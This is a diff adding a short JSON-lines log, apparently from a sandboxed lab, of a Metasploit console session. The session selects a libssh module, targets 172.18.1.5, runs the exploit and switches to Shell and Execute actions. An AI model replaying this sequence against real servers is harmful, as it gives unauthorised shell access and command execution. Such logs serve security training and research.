@@ -1,0 +1,12 @@
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T15:58:52.640366Z", "cmd_type": "msf-command", "cmd": "search libssh"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T15:59:09.186093Z", "cmd_type": "msf-command", "cmd": "use 0"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T15:59:17.189930Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T15:59:37.407596Z", "cmd_type": "msf-command", "cmd": "set rhosts 172.18.1.5"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T15:59:45.742254Z", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:00:09.128208Z", "cmd_type": "msf-command", "cmd": "sessions"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:00:37.096362Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:00:52.861544Z", "cmd_type": "msf-command", "cmd": "show actions"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:01:01.641978Z", "cmd_type": "msf-command", "cmd": "set action Shell"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:01:08.537170Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:01:13.681564Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:01:20.777125Z", "cmd_type": "msf-command", "cmd": "set action Execute"}
